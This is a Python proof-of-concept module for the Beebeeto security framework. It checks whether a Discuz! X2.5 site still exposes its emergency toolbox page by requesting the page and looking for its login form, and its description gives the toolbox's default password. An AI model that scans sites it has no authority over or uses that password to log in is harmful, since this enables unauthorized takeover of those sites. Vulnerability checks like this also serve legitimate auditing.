#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0071',
            'name': 'Discuz! X2.5 /source/plugin/tools/tools.php 急诊箱扫描 POC',
            'author': 'tmp',
            'create_date': '2015-03-24',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Discuz',
            'vul_version': ['2.5'],
            'type': 'Other',
            'tag': ['Discuz tools工具箱漏洞', 'DZ急诊箱扫描', 'php'],
            'desc': '如果急诊箱页面未删除，可能存在默认密码导致被入侵。默认密码：188281MWWxjk',
            'references': ['https://github.com/heavenK/bbs_new/blob/master/source/plugin/tools/tools.php',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        verify_url = '%s/source/plugin/tools/tools.php' % args['options']['target']
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        req = requests.get(verify_url)
        if req.status_code == 200 and '<title>Discuz!' in req.content:
            if '<form action="tools.php?action=login"' in req.content:
                args['success'] = True
                args['poc_ret']['vul_url'] = verify_url
        return args


    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())